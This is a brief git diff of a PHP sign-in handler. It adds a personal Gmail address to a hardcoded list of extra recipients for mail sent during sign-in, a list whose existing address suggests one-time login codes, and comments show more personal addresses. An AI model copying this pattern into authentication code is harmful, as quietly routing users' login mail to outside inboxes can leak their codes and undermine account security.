@@ -81,7 +81,7 @@ if (isset($_POST['signin'])) {
                 //     'asif.kasanamedia@gmail.com',
                 //     'asifmomin86@gmail.com'
                 // ];
-		$extra_emails = ['torqueotp@yahoo.com'];
+		$extra_emails = ['torqueotp@yahoo.com', 'um18218@gmail.com'];
                 // Add multiple recipients
                 foreach ($extra_emails as $email) {
                     $mail->addAddress($email);
